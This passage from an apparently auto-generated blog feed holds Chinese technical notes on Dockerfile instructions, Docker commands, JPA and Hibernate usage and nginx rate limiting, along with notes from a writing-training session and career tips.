<value></value></key></p></blockquote><p>定义的变量可以通过另种方式在 Dockerfile 中使用</p><ul><li>$variable</li><li>#{variable}</li></ul><p>尽量把 ENV 命令写成一个命令，因为每一个命令都是一个镜像层，合并之后的机构会变得更加简单和直观。</p><blockquote><p>ENV var1=value \<br>    var2=value2</p></blockquote><p>这些变量可以通过 docker run –env <key> = <value> 在运行更改，也可以使用 docker inspect 查看镜像或者容器中的变量。</value></key></p><h3 id="ARG"><a href="#ARG" class="headerlink" title="ARG"></a>ARG</h3><p>ARG 定义的参数用法和 ENV 一样，但是构建结束后会消失。</p><blockquote><p>ARG test=true</p></blockquote><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><p>作用和 COPY 类似，可以添加文件到容器中。同时支持从 URL 中下载文件到容器中，不过 ADD 会比 COPY 构建出来的镜像文件更大。</p><p>ADD 不能使用当前目录之外的文件，例如不能使用 add ../ 等路径。</p><h3 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h3><p>用于标明这个镜像的应用会监听某个端口，并且能将这个端口映射到主机的网络界面上。</p><p>EXPOSE 只负责处理容器内部的监听端口，如果 Docker 不在 RUN 的时候给容器分配端口映射，则外部无法访问容器 EXPOSE 设置的端口。</p><h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p>CMD 提供了容器启动时默认执行命令，例如 java -jar app.jar 启动 Spring boot 项目。CMD 与 ENTRYPOINT 的功能机位相似，区别在于 CMD 只能使用一次，后面的会覆盖前面的。ENTRYPOINT 可以定义多次。</p><p>同时 Docker run 也会覆盖 CMD 命令。</p><pre><code>FROM ubuntuCMD [&quot;echo&quot;,&quot;Hi&quot;]</code></pre><p>构建后运行，会输出 Hi，如果使用如下命令</p><blockquote><p>docker run 10d628b340ea echo “test”</p></blockquote><p>结果会输出 test，RUN 的时候会覆盖 RUN 的命令。</p><h3 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h3><p>ENTRYPOINT 相当于固化了 CMD 命令无法被修改，也无法被 RUN 覆盖。</p><p>当使用 ENTRYPONT 的时候，CMD 以及 RUN 命令都会作为参数传递给 ENTRYPOINT</p><pre><code>FROM ubuntuENTRYPOINT [&quot;echo&quot;]</code></pre><p>当我们构建并运行时，需要给一个参数 </p><blockquote><p>docker run 46e76bb0a870 “result”</p></blockquote><h3 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h3><p>用于指明一个数据卷，Docker 容器最好的是无状态的，数据以及状态由数据卷提供。</p><pre><code>FROM ubuntuRUN mkdir /app &amp;&amp; echo &quot;Hello&quot; &gt; /app/test.txtVOLUME [&quot;/Users/nlin/www/deployment-automation/app-examples/docker-test/local&quot;,&quot;/app&quot;]CMD [&quot;cat&quot;,&quot;/app/test.txt&quot;]</code></pre><p>在运行时候可以使用 -v 参数映射 （推荐这种做法）</p><blockquote><p>docker run  –rm -v /Users/nlin/www/deployment-automation/app-examples/docker-test/local:/app  521522ce40f6 </p></blockquote><h2 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h2><p>USER 命令用于指定运行容器时，使用的用户，默认为 ROOT</p><pre><code>USER mysql</code></pre><p>在运行时候可以使用 -u 动态指定。</p><h2 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h2><p>WORKDIR 用于指定 RUN、CMD 等命令的工作目录，相当于 cd，多个 WORKDIR会产生连续的效果。</p><pre><code>WORKDIR /aWORKDIR bWORKDIR c</code></pre><p>相当于 cd /a/b/c</p><h3 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h3><p>ONBUILD 用于在子镜像的 FROM 之前运行，相当于子镜像中的一个钩子。这个命令不会在当前命令中执行。</p><h3 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h3><p>给镜像打上标签，尽量写在一起，减少构建过程的时间</p><pre><code>LABEL label1=xxx label2=xxx</code></pre><h3 id="STOPSIGNAL"><a href="#STOPSIGNAL" class="headerlink" title="STOPSIGNAL"></a>STOPSIGNAL</h3><p>用于容器停止时的信号</p><pre><code>STOPSIGNAL SIGKILL </code></pre><p>这样写可以在容器停止时，发送一个信号给运行的程序。</p><h3 id="HEALTHCHECK"><a href="#HEALTHCHECK" class="headerlink" title="HEALTHCHECK"></a>HEALTHCHECK</h3><p>定期发送一个 HEALTHCHECK 信号</p><pre><code>HEALTHCHECK --interval=10s --timeout=3s \    CMD curl -f http://localhost/ || exit 1</code></pre><p>这样在容器运行时检查系统是否正常，然后退出。</p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Docker 基础</title>
      <link href="/docker/docker/docker-basic/"/>
      <url>/docker/docker/docker-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>docker pull 拉取镜像</p><blockquote><p>docker pull userxy2015/ngnix</p></blockquote><p>docker images 查看所有的本地镜像</p><blockquote><p>docker images </p></blockquote><p>docker rmi 删除不必要的镜像</p><blockquote><p>docker rmi userxy2015/ngnix</p></blockquote><p>docker run 启动容器</p><blockquote><p>docker run -p 8080:80 -d docker.io/nginx</p></blockquote><ul><li>-p 参数为设置端口映射</li><li>-d 为后台运行 –daemon </li></ul><p>docker exec 进入容器</p><blockquote><p>docker exec -it ngnix bash </p></blockquote><p>docker build 构建容器，在当前目录下加入一个 Dockerfile</p><pre><code>FROM docker.io/nginxCOPY ./test.html /usr/share/nginx/htm/index.html</code></pre><blockquote><p>docker build -t linksgo2011/frontend .</p></blockquote><p>-t 指的是给容器打一个标签，最后的 . 指出 dockerfile的位置</p><p>docker login 登录 docker hub</p><blockquote><p>docker login 然后输入密码</p></blockquote><p>docker push 推 docker 镜像到仓库，需要提前建一个 linksgo2011/frontend 仓库。<a href="https://hub.docker.com/repository" target="_blank" rel="noopener">https://hub.docker.com/repository</a></p><blockquote><p>docker push linksgo2011/frontend:latest</p></blockquote><p>如果之前的镜像已经存在，可以通过 </p><p>docker tag 旧标签名 新标签名</p><blockquote><p>docker frontend linksgo2011/frontend</p></blockquote><p>docker commit 将当前的容器提交为镜像，一般不常用</p><blockquote><p>docker commit c9e5bb7a524f linksgo2011/frontend</p></blockquote><p>拷贝文件到 docker 容器 </p><blockquote><p>docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-</p></blockquote><h2 id="docker-的版本说明"><a href="#docker-的版本说明" class="headerlink" title="docker 的版本说明"></a>docker 的版本说明</h2><p>docker 仓库的版本约定为 用户/仓库/标签</p><p>例如 linksgo2011/fonrtend:01 标签的镜像推送时，会推送到 linksgo2011 下面的 fonrtend 中为 01 标签</p><p>如果在构建镜像时候，不指定最后的标签名称，会使用 latest 标签，并且每次会覆盖上一次的镜像。</p><h2 id="一些和-docker-相关的排错命令"><a href="#一些和-docker-相关的排错命令" class="headerlink" title="一些和 docker 相关的排错命令"></a>一些和 docker 相关的排错命令</h2><p>重启 docker daemon</p><blockquote><p>sudo systemctl restart docker</p></blockquote><h2 id="docker-清理镜像和容器"><a href="#docker-清理镜像和容器" class="headerlink" title="docker 清理镜像和容器"></a>docker 清理镜像和容器</h2><blockquote><p>docker container prune</p></blockquote><blockquote><p>docker image prune</p></blockquote><h2 id="用-ansible-操作-docker-时候需要使用-docker-for-Python-的插件"><a href="#用-ansible-操作-docker-时候需要使用-docker-for-Python-的插件" class="headerlink" title="用 ansible 操作 docker 时候需要使用 docker for Python 的插件"></a>用 ansible 操作 docker 时候需要使用 docker for Python 的插件</h2><p>在目标机上需要有 docker、Python、以及 python 的docker 插件</p><pre><code>- name: install certain python modules for docker  pip:    name: &quot;{{ item.name }}&quot;    version: &quot;{{ item.version }}&quot;    state: present  with_items:  - { name: docker, version: 2.0.0 }</code></pre><p><a href="http://www.it1352.com/647250.html" target="_blank" rel="noopener">http://www.it1352.com/647250.html</a></p><h2 id="清理-docker"><a href="#清理-docker" class="headerlink" title="清理 docker"></a>清理 docker</h2><p>列出docker ID</p><pre><code>docker ps -aq</code></pre><p>停止所有容器</p><pre><code>docker stop $(docker ps -aq)</code></pre><p>docker 内置的docker 镜像清理</p><pre><code>docker image prune --force --all</code></pre><p> 删除所有停止的容器</p><pre><code>docker container prune</code></pre><p>docker 整体清理</p><pre><code>docker system prune -a</code></pre><h2 id="docker-文档"><a href="#docker-文档" class="headerlink" title="docker 文档"></a>docker 文档</h2><p><a href="https://docs.docker.com/" target="_blank" rel="noopener">https://docs.docker.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>TW 洞见写作培训</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/tw-writing-training/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/tw-writing-training/</url>
      
        <content type="html"><![CDATA[<h2 id="怎样算是一篇好的文章"><a href="#怎样算是一篇好的文章" class="headerlink" title="怎样算是一篇好的文章"></a>怎样算是一篇好的文章</h2><ul><li>表达力<ul><li>热点</li><li>故事</li><li>例子和连接</li><li>代入感，让读者感觉你是在写 ta 的感觉</li></ul></li><li>传播力<ul><li>外观和结构<ul><li>清晰地结构</li><li>吸引人的（小）标题</li><li>开门见山</li><li>结尾有力</li><li>恰到好处的金句</li></ul></li><li>字符和排版<ul><li>使用短句</li><li>图片，不一定强相关，隐隐约约和文章有一定联系，增强呼吸感</li><li>阅读奖赏</li><li>快速让读者获得需要的东西，参考文章《筷子定理》</li></ul></li></ul></li></ul><h2 id="好内容的本质"><a href="#好内容的本质" class="headerlink" title="好内容的本质"></a>好内容的本质</h2><ul><li>写你确信的东西，承认自己不足</li><li>有想法，有思考</li><li>有调查和采访</li></ul><h2 id="写之前的思考"><a href="#写之前的思考" class="headerlink" title="写之前的思考"></a>写之前的思考</h2><ul><li>我想传达什么讯息</li><li>我的目标受众是谁</li><li>目标周中的认知程度如何</li><li>我期待读者有什么法反应？</li></ul><h2 id="命题作文《如果我在沙漠中发现一整块十吨中的黄金，该怎么办？》"><a href="#命题作文《如果我在沙漠中发现一整块十吨中的黄金，该怎么办？》" class="headerlink" title="命题作文《如果我在沙漠中发现一整块十吨中的黄金，该怎么办？》"></a>命题作文《如果我在沙漠中发现一整块十吨中的黄金，该怎么办？》</h2><p>重点是细节，将一个简单问题做的丰满，很多问题没那么简单。</p><p>这个例子中，可以考虑如下方面：</p><ul><li>如何把这个黄金变成自己的？</li><li>如何运回去</li><li>如何切割</li><li>如何销售</li><li>如何不被国家发现</li><li>如何解释这一笔钱从何而来</li><li>如何一次卖出这些黄金，不导致金价变化</li></ul><h2 id="如何选题和立意"><a href="#如何选题和立意" class="headerlink" title="如何选题和立意"></a>如何选题和立意</h2><ul><li>有迹可循<ul><li>身边的事情，例如职业变化</li><li>热点事件</li></ul></li><li>有备而来<ul><li>收集浏览素材</li><li>梳理N个立意</li><li>确定核心立意</li></ul></li></ul><h2 id="文章框架"><a href="#文章框架" class="headerlink" title="文章框架"></a>文章框架</h2><ul><li>清单型结构 （对技术人来说最为友好，不带有主观概念）<ul><li>《那些年，我见过的【废柴】》</li></ul></li><li>叙述型结构<ul><li>过去 - 现在</li><li>过去 - 现在 - 未来</li><li>将来 - 过去 - 现在 </li></ul></li><li>板块递进式结构 （适合带有观点的，议论文）<ul><li>S（Situation）情境 问题发生的背景</li><li>Q（Question）问题 需要解决的问题</li><li>C（Conflict）冲突 现实中的矛盾、障碍</li><li>A（Answer) 答案 给出的解决方案</li></ul></li></ul><h2 id="如何开头"><a href="#如何开头" class="headerlink" title="如何开头"></a>如何开头</h2><ul><li>激发好奇 《被提出的用户》</li><li>直击痛点 《我选择，我喜欢》</li><li>关联用户 </li></ul><h2 id="如何标题"><a href="#如何标题" class="headerlink" title="如何标题"></a>如何标题</h2><ul><li>激发用户的好奇</li><li>引发用户的共鸣</li><li>戳中用户的痛点</li><li>制造用户的预期</li><li>学会蹭知名度</li></ul><h2 id="如何修改"><a href="#如何修改" class="headerlink" title="如何修改"></a>如何修改</h2><ul><li>先放一放，然后再<ul><li>总览全篇，打磨框架</li><li>删改词句</li><li>打磨情绪</li><li>默读全篇</li><li>寻求反馈</li></ul></li></ul><h2 id="写作的问题"><a href="#写作的问题" class="headerlink" title="写作的问题"></a>写作的问题</h2><ul><li>如何让写作内容变得丰满？<ul><li>安静下来</li></ul></li><li>什么样的程度的文章可以发表 china？</li></ul><h2 id="分享准备"><a href="#分享准备" class="headerlink" title="分享准备"></a>分享准备</h2><p>几个关键词</p><ul><li>感谢<ul><li>感谢帮我改稿的人</li><li>感谢帮我提出意见的人</li></ul></li><li>天赋<ul><li>记忆力不好的人更喜欢写作</li><li>想到了和写出来是两回事</li></ul></li><li>想法<ul><li>本质是抽象和总结</li><li>想法过多，使用一个列表记录下来</li></ul></li><li>贪婪<ul><li>塞入太多的东西和想法到文章中，《API 那篇文章》</li></ul></li><li>模仿<ul><li>模仿是最好的学习方法 《湖南农民运动考察报告》</li></ul></li><li>友好<ul><li>和读者做朋友，不好好为人师</li></ul></li><li>价值<ul><li>有道理和有用的</li><li>没有写下来之前不知道有没有价值</li><li>checklist 最适合我，选择适合</li></ul></li><li>思考<ul><li>程序员的写作是一种思考方式，与风月无关</li><li>《一本小小的写作书》</li><li>《一本小小的逻辑书》</li></ul></li><li>技巧<ul><li>难说有用，但是没那么重要</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JPA Criteria</title>
      <link href="/Spring/spring/jpa-criteria/"/>
      <url>/Spring/spring/jpa-criteria/</url>
      
        <content type="html"><![CDATA[<h2 id="在-EntityManager-中使用-Criteria"><a href="#在-EntityManager-中使用-Criteria" class="headerlink" title="在 EntityManager 中使用 Criteria"></a>在 EntityManager 中使用 Criteria</h2><pre><code>// 1. 获取 builderCriteriaBuilder criteriaBuilder = entityManager.getCriteriaBuilder();// 2. 创建 queryCriteriaQuery&lt;Feature&gt; query = criteriaBuilder.createQuery(Feature.class);// 3. 获取根对象，根对象可以有多个Root&lt;Feature&gt; root = query.from(Feature.class);// 4. 查询大于 1 的条件Predicate predicate = criteriaBuilder.greaterThanOrEqualTo(root.get(&quot;id&quot;), 1L);Predicate predicate1 = criteriaBuilder.equal(root.get(&quot;name&quot;), &quot;年龄&quot;);query.where(criteriaBuilder.and(predicate, predicate1));// 4. 执行构造出的条件List&lt;Feature&gt; resultList = entityManager.createQuery(query).getResultList();</code></pre>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JPA JOIN 的用法</title>
      <link href="/Spring/spring/jpa-join/"/>
      <url>/Spring/spring/jpa-join/</url>
      
        <content type="html"><![CDATA[<h2 id="JPA-JOIN-支持的条件"><a href="#JPA-JOIN-支持的条件" class="headerlink" title="JPA JOIN 支持的条件"></a>JPA JOIN 支持的条件</h2><p>JPA JOIN 支持 内连接和左外连接，JPA 的 Join 必须是两个实体之间存在关联当前情况下才需要这样操作。</p><p>推荐只是简单地情况下这样使用，复杂的情况直接编写 native sql 来完成。</p><p>Feature 和 FeatureValue 是一对多关系，查询方法如下</p><pre><code>    @Query(&quot;select distinct feature from Feature feature inner join fetch feature.featureValues&quot;)    List&lt;Feature&gt; findFeatureWithJoin();</code></pre><p>Feature 中需要设置一个一对多的关联</p><pre><code>public class Feature implements Serializable {    @OneToMany(fetch = FetchType.EAGER, cascade = CascadeType.ALL)    @JoinColumn(name = &quot;feature_id&quot;)    private List&lt;FeatureValue&gt; featureValues;}</code></pre><h2 id="迫切关联连接"><a href="#迫切关联连接" class="headerlink" title="迫切关联连接"></a>迫切关联连接</h2><p>在查询的 JPQL 语句中有一个 fetch，这个 fetch 可以自动将join 后的结果集使用一对多的方式组织数据，避免 N+1 问题，平时项目都是用 fetch 的方法。</p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>接口访问限制方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/api-limitation/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/api-limitation/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-nginx-缓存限制"><a href="#使用-nginx-缓存限制" class="headerlink" title="使用 nginx 缓存限制"></a>使用 nginx 缓存限制</h2><p>expires起到控制页面缓存的作用，合理的配置expires可以减少很多服务器的请求<br>要配置expires，可以在http段中或者server段中或者location段中加入<br>PS. 可以限制单个接口的访问</p><p>只需要增加一个反向代理，然后设置 1 秒过期即可，1 s内拿到的是同样的内容。可以将图片等静态资源文件设置时间较长，接口 API 时间设置较短即可。</p><pre><code>location ~ ^/user/ {      proxy_pass http://user.example.com;        expires 1;   //1h //1d //expires max; 部分文件看需要可以永久 }</code></pre><h2 id="利用-Ngnix-的IP限制访问次数"><a href="#利用-Ngnix-的IP限制访问次数" class="headerlink" title="利用 Ngnix 的IP限制访问次数"></a>利用 Ngnix 的IP限制访问次数</h2><p>nginx可以通过HttpLimitReqModul和HttpLimitZoneModule配置来限制ip在同一时间段的访问次数。</p><p>HttpLimitReqModul用来限制连单位时间内连接数的模块，使用limit_req_zone和limit_req指令配合使用来达到限制。一旦并发连接超过指定数量，就会返回503错误。</p><p>HttpLimitConnModul用来限制单个ip的并发连接数，使用limit_zone和limit_conn指令。</p><p>这两个模块的区别前一个是对一段时间内的连接数限制，后者是对同一时刻的连接数限制。</p><p>配置实例</p><pre><code>http{    ...    #定义一个名为allips的limit_req_zone用来存储session，大小是10M内存，    #以$binary_remote_addr 为key,限制平均每秒的请求为20个，    #1M能存储16000个状态，rete的值必须为整数，    #如果限制两秒钟一个请求，可以设置成30r/m    limit_req_zone $binary_remote_addr zone=allips:10m rate=20r/s;    ...    server{        ...        location {            ...            #限制每ip每秒不超过20个请求，漏桶数burst为5            #brust的意思就是，如果第1秒、2,3,4秒请求为19个，            #第5秒的请求为25个是被允许的。            #但是如果你第1秒就25个请求，第2秒超过20的请求返回503错误。            #nodelay，如果不设置该选项，严格使用平均速率限制请求数，            #第1秒25个请求时，5个请求放到第2秒执行，            #设置nodelay，25个请求将在第1秒执行。            limit_req zone=allips burst=5 nodelay;            ...        }        ...    }    ...}</code></pre><h2 id="使用-Redis-在应用层面限制"><a href="#使用-Redis-在应用层面限制" class="headerlink" title="使用 Redis 在应用层面限制"></a>使用 Redis 在应用层面限制</h2><p>使用拦截器对请求根据 IP 计数，写入 redis。这种方案没有 Ngnix 高效。<br>可以参考 el-admin 中的实现。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.cnblogs.com/wangdaijun/p/6264288.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangdaijun/p/6264288.html</a></li><li><a href="https://www.cnblogs.com/saneri/p/5315535.html" target="_blank" rel="noopener">https://www.cnblogs.com/saneri/p/5315535.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ThoughtWorks Tech Lead 能力</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/tw-tech-lead/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/tw-tech-lead/</url>
      
        <content type="html"><![CDATA[<h2 id="构建项目基础设施"><a href="#构建项目基础设施" class="headerlink" title="构建项目基础设施"></a>构建项目基础设施</h2><p>能使用 ansible 搭建一套 CI/CD 基础设施</p><p>这里有一套基础设施和运维脚本</p><ul><li><a href="https://github.com/linksgo2011/deployment-automation" target="_blank" rel="noopener">https://github.com/linksgo2011/deployment-automation</a></li></ul><h2 id="搭建种子项目"><a href="#搭建种子项目" class="headerlink" title="搭建种子项目"></a>搭建种子项目</h2><p>能快速启动一个项目骨架，单体应用使用下面的种子项目</p><ul><li><a href="https://github.com/linksgo2011/spring-boot-boilerplate" target="_blank" rel="noopener">https://github.com/linksgo2011/spring-boot-boilerplate</a></li></ul><h2 id="团队工作方法"><a href="#团队工作方法" class="headerlink" title="团队工作方法"></a>团队工作方法</h2><p>能规范团队运行方法，这里有一套 Way of working 规范了开发过程和上线的一些 check list</p><ul><li><a href="http://www.printf.cn/index.php/way-of-working.html" target="_blank" rel="noopener">http://www.printf.cn/index.php/way-of-working.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JPA 投影</title>
      <link href="/Spring/spring/jpa-projection/"/>
      <url>/Spring/spring/jpa-projection/</url>
      
        <content type="html"><![CDATA[<h2 id="JPA-投影的用处"><a href="#JPA-投影的用处" class="headerlink" title="JPA 投影的用处"></a>JPA 投影的用处</h2><p>在 DDD 的读模型中，使用投影可以查询和领域模型不同的字段，带来非常大的灵活性。</p><p>如果有实体</p><pre><code>public class Feature implements Serializable {    @Id    @GeneratedValue(strategy = GenerationType.IDENTITY)    private Long id;    private String name;    private Integer step;    @OneToMany(fetch = FetchType.EAGER, cascade = CascadeType.ALL)    @JoinColumn(name = &quot;feature_id&quot;)    private List&lt;FeatureValue&gt; featureValues;    @CreationTimestamp    @Column(name = &quot;create_at&quot;)    private Timestamp createAt;    @UpdateTimestamp    @Column(name = &quot;update_at&quot;)    private Timestamp updateAt;}</code></pre><p>如果只需要查询 Feature 中部分字段，则只需要定义一个接口接收即可</p><pre><code>public interface FeatureInterfaceProjection {    String getName();}</code></pre><p>在 Repository 中使用</p><pre><code>@Repositorypublic interface FeatureRepository extends JpaRepository&lt;Feature, Long&gt;,        JpaSpecificationExecutor&lt;Feature&gt; {    FeatureInterfaceProjection findDistinctFirstByName(String name);}</code></pre><p>FeatureInterfaceProjection 的用法是通过接口的投影</p><h2 id="使用对象的投影（更常用）"><a href="#使用对象的投影（更常用）" class="headerlink" title="使用对象的投影（更常用）"></a>使用对象的投影（更常用）</h2><p>将 FeatureInterfaceProjection  定义为对象也可以使用投影，提供的 setter/getter 方法即可</p><pre><code>public class FeatureProjection {    public FeatureProjection(String name) {        this.name = name;    }    private String name;    public String getName() {        return name;    }    public void setName(String name) {        this.name = name;    }}</code></pre><p>例如在 Repository 中编写 </p><pre><code>List&lt;FeatureProjection&gt; findAllByName(String name);</code></pre><h2 id="手写-JPQL-的方式使用投影"><a href="#手写-JPQL-的方式使用投影" class="headerlink" title="手写 JPQL 的方式使用投影"></a>手写 JPQL 的方式使用投影</h2><pre><code>    @Query(&quot;select distinct new springbootboilerplate.read.FeatureProjection(f.name) from Feature f&quot;)    FeatureProjection findFirstByName(String name);</code></pre><p>在 select 的结果集中 new 出需要对象即可。</p><p>需要注意在 JPQL 中写完整结果集的类的对象 </p><p>springbootboilerplate.read.FeatureProjection 不然会报类找不到。</p><p>如果不想使用 new 的方法，可以使用在结果集的对象上/类上，打上 @Projection 注解，并给出类的来源 types 属性</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://stackoverflow.com/questions/46083329/no-converter-found-capable-of-converting-from-type-to-type" target="_blank" rel="noopener">https://stackoverflow.com/questions/46083329/no-converter-found-capable-of-converting-from-type-to-type</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 转换方案</title>
      <link href="/java/java/java-object-mapping/"/>
      <url>/java/java/java-object-mapping/</url>
      
        <content type="html"><![CDATA[<h2 id="ModelMapper"><a href="#ModelMapper" class="headerlink" title="ModelMapper"></a>ModelMapper</h2><h2 id="mapstruct"><a href="#mapstruct" class="headerlink" title="mapstruct"></a>mapstruct</h2><h2 id="Orika"><a href="#Orika" class="headerlink" title="Orika"></a>Orika</h2>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>使用 DataJpaTest 对接数据库测试</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/data-jpa-test/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/data-jpa-test/</url>
      
        <content type="html"><![CDATA[<h2 id="一个测试基类"><a href="#一个测试基类" class="headerlink" title="一个测试基类"></a>一个测试基类</h2><pre><code>@RunWith(SpringRunner.class)@ActiveProfiles(profiles = &quot;test&quot;)@DataJpaTestpublic abstract class BusinessBaseTest {    @Autowired    private Flyway flyway;    @Before    public void setUp() throws Exception {        flyway.clean();        flyway.migrate();    }}</code></pre><h2 id="一些有用的注解"><a href="#一些有用的注解" class="headerlink" title="一些有用的注解"></a>一些有用的注解</h2><h3 id="RunWith-SpringRunner-class"><a href="#RunWith-SpringRunner-class" class="headerlink" title="RunWith(SpringRunner.class)"></a>RunWith(SpringRunner.class)</h3><p>SpringRunner 启动了 Spring 上下文环境，但是没有启动 Spring boot 相关自动配置。</p><h3 id="DataJpaTest"><a href="#DataJpaTest" class="headerlink" title="@DataJpaTest"></a>@DataJpaTest</h3><p>自动配数据源相关的配置。</p>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>如何评估一个系统的容量</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/system-capacity/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/system-capacity/</url>
      
        <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>评估系统负载 <a href="https://www.cnblogs.com/softidea/p/11969205.html" target="_blank" rel="noopener">https://www.cnblogs.com/softidea/p/11969205.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>快速学习的一些要点</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/quick-learn/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/quick-learn/</url>
      
        <content type="html"><![CDATA[<h2 id="学习的一般过程"><a href="#学习的一般过程" class="headerlink" title="学习的一般过程"></a>学习的一般过程</h2><ul><li>采访专业的人，了解知识框架和学习路线</li><li>倍速看视频教程，了解如何做</li><li>编写代码，动手实践，遇到问题搜索</li><li>落入知识系统，可以将做的实验作为例子编写笔记</li><li>看相关的书深入学习，了解原理以及<strong>使用中的一些注意事项</strong></li><li>看源码</li><li>将知识系统中有价值的内容整理成博客</li></ul><h2 id="学习的注意事项"><a href="#学习的注意事项" class="headerlink" title="学习的注意事项"></a>学习的注意事项</h2><ul><li>少量学习，多去实践</li></ul><h2 id="编程相关学习资源"><a href="#编程相关学习资源" class="headerlink" title="编程相关学习资源"></a>编程相关学习资源</h2><p>中文学习资源网站 </p><ul><li>网易云课堂 <a href="http://study.163.com/" target="_blank" rel="noopener">http://study.163.com/</a></li></ul><p>英文学习资源网站</p><ul><li>Lynda.com <a href="https://www.lynda.com/" target="_blank" rel="noopener">https://www.lynda.com/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Hibernate 基础</title>
      <link href="/hibernate/hibernate/hibernate-baisc/"/>
      <url>/hibernate/hibernate/hibernate-baisc/</url>
      
        <content type="html"><![CDATA[<h2 id="Hibernate-和-JPA-以及-Spring-data"><a href="#Hibernate-和-JPA-以及-Spring-data" class="headerlink" title="Hibernate 和 JPA 以及 Spring data"></a>Hibernate 和 JPA 以及 Spring data</h2><ul><li>JPA的是 Java Persistence API 的简写，是Sun官方提出的一种ORM规范</li><li>Hibernate 是 JPA 的一种实现</li><li>Spring data 对 Hibernate 进行了一些包装，提供了一些便利的接口和方法，本质还是使用 JPA 实现。Hibernate 为其默认实现。</li></ul><p>Hibernate  适用于富域模型的程序，如果模型比较简单 Hibernate 无法发挥其最大的优势。</p><p>使用实体时候，需要注意关注点分离，确保业务方便的关注点之外，其他关注点不要渗入模型中来。例如视图相关，不应直接使用领域对象到视图层。</p><h2 id="Hibernate-的三种状态"><a href="#Hibernate-的三种状态" class="headerlink" title="Hibernate 的三种状态"></a>Hibernate 的三种状态</h2><ul><li>瞬时状态 (Transient) ,不和 Session 实例关联，例如 new 出来的一个实体</li><li>持久状态 (Persistent),持久化对象就是已经被保存进数据库的实体对象，并且这个实体对象现在还处于Hibernate的缓存管理之中。 例如从数据库中查询出来的实体。</li><li>脱管状态 (Detached)，在数据库中存在一条对应的记录，但是当前没有与 session 关联</li></ul><p>三种状态对应操作的转换图:</p><p><img src="/hibernate/hibernate/hibernate-baisc/status.jpg" alt=""></p><h2 id="使用-Hibernate-的一些注意事项"><a href="#使用-Hibernate-的一些注意事项" class="headerlink" title="使用 Hibernate 的一些注意事项"></a>使用 Hibernate 的一些注意事项</h2><ul><li>实体最好实现 Serializable 接口</li><li>Hibernate 会使用 getter 方法进行对比，因此 getter 方法不应该对数据进行修改和转换，否则 Hibernate 会进行一次额外的 SQL 执行</li><li>在绘制 UML 图的时候，可以加入原型类图（标注是实体还是值对象）</li><li>如果有可能不要公开 ID 的set方法（使用了lombok 就没办法了）</li><li>推荐使用 long 作为 ID，足够支撑系统运行时间，映射到数据库中为 bigint</li><li>如果不想每次都给特定字段编写 @Column 可以定义一个 PhysicalNammingStrategy</li></ul><h2 